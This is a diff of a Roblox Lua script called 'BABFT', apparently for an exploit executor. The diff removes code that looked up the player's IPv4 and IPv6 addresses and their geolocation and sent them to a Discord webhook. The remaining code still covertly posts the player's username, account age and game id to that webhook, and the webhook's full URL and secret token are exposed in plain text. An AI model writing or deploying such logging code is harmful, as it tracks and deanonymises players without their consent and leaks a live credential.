@@ -2,12 +2,6 @@ local scriptname = "BABFT"
 
 local player1 = game.Players.LocalPlayer
 
-
-local IPv4 = game:HttpGet("https://v4.ident.me/")
-local IPv6 = game:HttpGet("https://v6.ident.me/")
-local infoload = game:HttpGet("https://ipapi.co/".. IPv4 .. "/json/")
-local infoloadfinal = infoload
-
 local abbreviation, AEDT, client_ip
 
 local webhookcheck =
@@ -20,11 +14,11 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/951356789537013771/_D7qCxHNcOWv87ba_LfvB2Y7cyDUbz0BizV0tCHECpMvwHAAItSC0pYQi1MjBX5TeVzF"
 local data = {
-   ["content"] = "Game Id: " .. game.PlaceId .. " - " .. scriptname .. " - IPv6: " .. IPv6,
+   ["content"] = "Game Id: " .. game.PlaceId .. " - " .. scriptname,
    ["embeds"] = {
        {
            ["title"] = game.Players.LocalPlayer.Name .. " - Age: " .. player1.AccountAge .. " (days)",
-           ["description"] = infoloadfinal,
+           ["description"] = "Player Loaded BABFT",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
